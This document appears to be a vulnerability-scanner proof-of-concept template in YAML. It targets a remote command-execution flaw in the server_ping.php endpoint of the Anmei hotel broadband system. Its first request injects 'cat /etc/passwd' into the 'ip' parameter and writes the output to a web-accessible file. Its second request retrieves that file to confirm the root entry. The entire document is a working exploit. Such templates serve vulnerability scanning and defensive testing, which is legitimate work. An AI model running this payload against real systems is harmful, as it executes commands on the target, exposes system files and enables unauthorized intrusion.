name: poc-yaml-anmei-rce
transport: http
set:
    rand: randomLowercase(7)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../{{rand}}.txt&id=1
            follow_redirects: false            
        expression: response.status == 200 && "parent.doTestResult".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /{{rand}}.txt
            follow_redirects: false            
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)       
expression: r0() && r1()
detail:
    author: TTMTac (https://github.com/TTMTac)
    links:
        - http://wiki.peiqi.tech/wiki/webapp/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%20%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%20server_ping.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html